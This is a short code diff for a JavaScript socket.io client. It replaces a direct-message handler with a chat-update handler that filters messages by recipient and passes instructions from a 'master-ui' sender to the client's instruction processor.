@@ -230,14 +230,17 @@ function registerHandlers() {
         console.log('[!] Disconnected from HQ');
     });
 
-    sio.on('direct_message', (data) => {
-        const sender = data.from || 'unknown';
-        const msg = data.msg || '';
-        console.log(`[DM] From ${sender}: ${msg}`);
-        if (sender === 'master-ui') {
-            processInstruction(msg, sender);
-        }
-    });
+  sio.on('chat_update', (data) => {
+    const sender = data.from || 'unknown';
+    const msg = data.msg || '';
+    const to = data.to || 'all';
+    console.log(`[CHAT] From ${sender} to ${to}: ${msg}`);
+    if ((to === args.id || to === 'all') && sender !== args.id) {
+      if (sender === 'master-ui') {
+        processInstruction(msg, sender);
+      }
+    }
+  });
 
     sio.on('command', (data) => {
         const cmdId = data.id;
